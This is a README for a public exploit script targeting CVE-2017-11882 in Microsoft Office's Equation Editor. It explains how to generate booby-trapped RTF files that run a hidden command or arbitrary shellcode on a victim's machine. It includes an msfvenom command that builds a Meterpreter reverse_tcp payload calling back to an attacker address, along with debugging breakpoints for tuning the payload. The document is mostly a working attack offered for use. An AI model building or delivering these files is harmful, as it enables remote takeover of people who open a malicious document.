# CVE-2017-11882 Exploit

CVE-2017-11882 Exploit accepts 605 bytes long command/code in maximum.

For remote command execution,this exploit will call WinExec with SW_HIDE and call ExitProcess after WinExec returns.

For remote code execution,this exploit just jmp to code.

I cannot find a reference for the object structure...so I cannot change the file length for arbitrary length code execution..:(

Please issue me if you know how to enlarge the payload , thanks.

## Usage
```
usage: CVE-2017-11882.py [-h] -c CMD [-t TYPE] -o OUTPUT

Exploit for CVE-2017-11882 @unamer(https://github.com/unamer/CVE-2017-11882)

optional arguments:
  -h, --help            show this help message and exit
  -c CMD, --cmd CMD     Command or shellcode file to run in target system
                        (Must be shorter than 605 bytes!!)
  -t TYPE, --type TYPE  Type (0:shellcode 1:command, default=1)
  -o OUTPUT, --output OUTPUT
                        Output exploit rtf
```

Example:

For remote command execution
```
CVE-2017-11882.py -c cmd.exe -o test.rtf
```

For remote code execution

1. Generate some shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=2333 -o ./sc.bin
```

2. Generate exploit
```
CVE-2017-11882.py -c sc.bin -t 0 -o test.rtf
```
## Debug

 1. Set debugger value to your debugger path in HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EQNEDT32.EXE

 2. Build a exploit and run it.
 
 3. Set break point at 0x41165f
 
 4. This break point will be hit twice, at second time the payload will be executed after this function returned.
